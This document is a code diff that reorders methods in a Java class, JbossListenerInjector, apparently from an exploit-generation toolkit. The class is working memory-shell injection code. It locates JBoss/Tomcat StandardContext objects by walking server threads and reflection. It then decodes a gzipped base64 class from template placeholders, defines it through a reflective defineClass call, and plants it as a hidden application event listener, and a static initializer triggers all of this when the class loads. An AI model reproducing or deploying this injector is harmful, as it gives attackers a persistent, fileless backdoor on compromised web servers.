@@ -18,14 +18,6 @@ import java.util.zip.GZIPInputStream;
  */
 public class JbossListenerInjector {
 
-    public String getClassName() {
-        return "{{className}}";
-    }
-
-    public String getBase64String() {
-        return "{{base64Str}}";
-    }
-
     static {
         new JbossListenerInjector();
     }
@@ -39,89 +31,6 @@ public class JbossListenerInjector {
             }
         } catch (Exception ignored) {
         }
-    }
-
-    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
-        List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
-        try {
-            for (Thread thread : threads) {
-                if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                    Map<?, ?> childrenMap = (Map<?, ?>) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
-                    for (Object key : childrenMap.keySet()) {
-                        Map<?, ?> children = (Map<?, ?>) getFV(childrenMap.get(key), "children");
-                        for (Object key1 : children.keySet()) {
-                            Object context = children.get(key1);
-                            if (context != null && context.getClass().getName().contains("StandardContext")) {
-                                contexts.add(context);
-                            }
-                        }
-                    }
-                }
-            }
-        } catch (Exception e) {
-            throw new RuntimeException(e);
-        }
-        return contexts;
-    }
-
-    private Object getListener(Object context) {
-        Object listener = null;
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
-        try {
-            listener = classLoader.loadClass(getClassName()).newInstance();
-        } catch (Exception e) {
-            try {
-                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
-                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                defineClass.setAccessible(true);
-                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                listener = clazz.newInstance();
-            } catch (Throwable ignored) {
-            }
-        }
-        return listener;
-    }
-
-    @SuppressWarnings("all")
-    public void addListener(Object context, Object listener) throws Exception {
-        if (!this.isInjected(context, this.getClassName())) {
-            String filedName = "applicationEventListenersObjects";
-            Object applicationEventListenersObjects = getFV(context, filedName);
-            if (applicationEventListenersObjects == null) {
-                filedName = "applicationEventListenersInstances";
-                applicationEventListenersObjects = getFV(context, filedName);
-            }
-            if (applicationEventListenersObjects != null) {
-                Object[] appListeners = (Object[]) applicationEventListenersObjects;
-                if (appListeners != null) {
-                    List appListenerList = new ArrayList(Arrays.asList(appListeners));
-                    appListenerList.add(listener);
-                    setFieldValue(context, filedName, appListenerList.toArray());
-                }
-            } else if (getFV(context, "applicationEventListenersList") != null) {
-                List<Object> appListeners = (List) getFV(context, "applicationEventListenersList");
-                if (appListeners != null) {
-                    appListeners.add(listener);
-                }
-            }
-        }
-    }
-
-    @SuppressWarnings("all")
-    public boolean isInjected(Object context, String evilClassName) throws Exception {
-        Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners");
-        List listeners = Arrays.asList(objects);
-        ArrayList arrayList = new ArrayList(listeners);
-        for (Object o : arrayList) {
-            if (o.getClass().getName().contains(evilClassName)) {
-                return true;
-            }
-        }
-        return false;
     }
 
     @SuppressWarnings("all")
@@ -224,5 +133,96 @@ public class JbossListenerInjector {
                 throw new RuntimeException(e.getMessage());
             }
         }
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
+
+    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
+        List<Object> contexts = new ArrayList<Object>();
+        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
+        try {
+            for (Thread thread : threads) {
+                if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                    Map<?, ?> childrenMap = (Map<?, ?>) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
+                    for (Object key : childrenMap.keySet()) {
+                        Map<?, ?> children = (Map<?, ?>) getFV(childrenMap.get(key), "children");
+                        for (Object key1 : children.keySet()) {
+                            Object context = children.get(key1);
+                            if (context != null && context.getClass().getName().contains("StandardContext")) {
+                                contexts.add(context);
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+        return contexts;
+    }
+
+    private Object getListener(Object context) {
+        Object listener = null;
+        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+        if (classLoader == null) {
+            classLoader = context.getClass().getClassLoader();
+        }
+        try {
+            listener = classLoader.loadClass(getClassName()).newInstance();
+        } catch (Exception e) {
+            try {
+                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
+                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                defineClass.setAccessible(true);
+                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+                listener = clazz.newInstance();
+            } catch (Throwable ignored) {
+            }
+        }
+        return listener;
+    }
+
+    @SuppressWarnings("all")
+    public void addListener(Object context, Object listener) throws Exception {
+        if (!this.isInjected(context, this.getClassName())) {
+            String filedName = "applicationEventListenersObjects";
+            Object applicationEventListenersObjects = getFV(context, filedName);
+            if (applicationEventListenersObjects == null) {
+                filedName = "applicationEventListenersInstances";
+                applicationEventListenersObjects = getFV(context, filedName);
+            }
+            if (applicationEventListenersObjects != null) {
+                Object[] appListeners = (Object[]) applicationEventListenersObjects;
+                if (appListeners != null) {
+                    List appListenerList = new ArrayList(Arrays.asList(appListeners));
+                    appListenerList.add(listener);
+                    setFieldValue(context, filedName, appListenerList.toArray());
+                }
+            } else if (getFV(context, "applicationEventListenersList") != null) {
+                List<Object> appListeners = (List) getFV(context, "applicationEventListenersList");
+                if (appListeners != null) {
+                    appListeners.add(listener);
+                }
+            }
+        }
+    }
+
+    @SuppressWarnings("all")
+    public boolean isInjected(Object context, String evilClassName) throws Exception {
+        Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners");
+        List listeners = Arrays.asList(objects);
+        ArrayList arrayList = new ArrayList(listeners);
+        for (Object o : arrayList) {
+            if (o.getClass().getName().contains(evilClassName)) {
+                return true;
+            }
+        }
+        return false;
     }
 }
